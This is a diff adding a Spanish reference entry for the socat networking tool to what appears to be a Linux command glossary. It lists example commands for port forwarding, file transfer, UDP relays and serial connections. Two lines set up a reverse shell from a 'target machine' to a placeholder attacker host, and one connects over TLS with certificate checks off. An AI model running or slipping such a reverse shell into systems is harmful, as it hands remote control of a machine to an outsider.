@@ -57128,6 +57128,31 @@ Un ejempo de archivo sntoprc seria:
 	el del comedor
 
 
+socat
+[SOcket CAT]. Herramienta multipropósito que establece dos flujos de bytes bidireccionales y transfiere datos entre ellos. Es como una versión mucho más potente y flexible de netcat [ver]. Los canales de datos pueden ser archivos, tuberías, dispositivos [terminal o módem, etc.] o sockets [Unix, IPv4, IPv6, raw, UDP, TCP, SSL]. Ofrece bifurcación, registro y rastreo, diferentes modos para la comunicación entre procesos, como relé TCP de un solo uso o demonio, como generador de sockets externo, como interfaz de shell para sockets Unix, como relé IPv6, como reemplazo de netcat y rinetd, para redirigir programas orientados a TCP a una línea serie, o para establecer un entorno relativamente seguro [su y chroot] para ejecutar scripts de shell de cliente o servidor dentro de conexiones de red.
+$ socat - TCP:example.com:80 (conexión interactiva similar a netcat / telnet a un servidor web)
+$ socat -d -d - TCP4:www.example.com:80 (lo mismo con más información de depuración)
+$ socat TCP-LISTEN:1234,reuseaddr STDOUT (escucha en el puerto 1234 y muestra todo lo que llega por pantalla)
+$ socat TCP-LISTEN:1234,reuseaddr,fork STDOUT (acepta varias conexiones)
+$ socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.100:80 (escucha en el puerto 8080 y reenvía todo a un servidor remoto en el puerto 80)
+$ socat TCP-LISTEN:8080,bind=127.0.0.1,reuseaddr,fork TCP:example.com:80 (escucha en localhost)
+$ socat TCP-LISTEN:3307,reuseaddr,fork UNIX-CONNECT:/var/lib/mysql/mysql.sock (reenviar un socket Unix MySQL a un puerto TCP)
+$ socat TCP-LISTEN:4444,reuseaddr FILE:archivo.txt (envíar archivo desde el servidor )
+$ socat TCP-LISTEN:4444 < archivo.txt (de forma más simple con redireccion)
+$ socat TCP:ip-del-servidor:4444 FILE:archivo_recibido.txt,create (recibir el archivo desde el cliente)
+$ socat TCP:servidor:4444 > archivo_recibido.txt (de forma más simple con redireccion)
+$ socat TCP-LISTEN:9000,reuseaddr,fork EXEC:/bin/cat (crear un servidor echo simple. Todo lo que se envíe se devolverá)
+$ socat TCP-LISTEN:4444,reuseaddr - (escucha [máquina atacante / controlador])
+$ socat EXEC:/bin/bash TCP:ip-del-atacante:4444 (en la máquina objetivo)
+$ socat -u STDIO FILE:salida.txt,create (comunicación unidireccional solo de izquierda a derecha)
+$ socat -u TCP-LISTEN:3334,reuseaddr,fork OPEN:/tmp/mensajes.log,creat,append (guardar todo lo que llega por un puerto en un fichero de log)
+$ socat UDP4-RECVFROM:5353,reuseaddr,fork UDP4-SENDTO:8.8.8.8:53 (reenvío UDP)
+$ socat UDP-LISTEN:1234,reuseaddr STDOUT (escuchar UDP y mostrar)
+$ socat - OPENSSL:example.com:443,verify=0 (conectar a un servicio HTTPS sin verificar certificado)
+$ socat - TCP-LISTEN:25,crlf (emular un servidor de correo SMTP a mano)
+$ socat - /dev/ttyUSB0,raw,echo=0,crlf (conectar a un puerto serie)
+
+
 socklist
 [procinfo]. Lista conectores de red abiertos (sockets), mostrando tipo, número de puerto y otros datos específicos.
 $ socklist
